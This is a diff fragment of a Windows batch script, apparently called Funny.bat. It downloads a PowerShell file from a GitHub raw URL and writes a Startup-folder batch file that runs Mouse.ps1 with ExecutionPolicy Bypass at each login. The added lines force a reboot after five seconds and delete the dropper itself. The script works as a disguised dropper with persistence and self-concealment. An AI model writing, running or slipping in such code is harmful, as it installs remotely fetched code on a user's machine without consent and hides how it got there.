@@ -3,3 +3,6 @@ Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkcho
 cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo cd %%homepath%% > A.bat
 echo powershell -ExecutionPolicy Bypass -File Mouse.ps1 >> A.bat
+Shutdown /r /t 5
+cd /D "%~dp0" 
+del Funny.bat
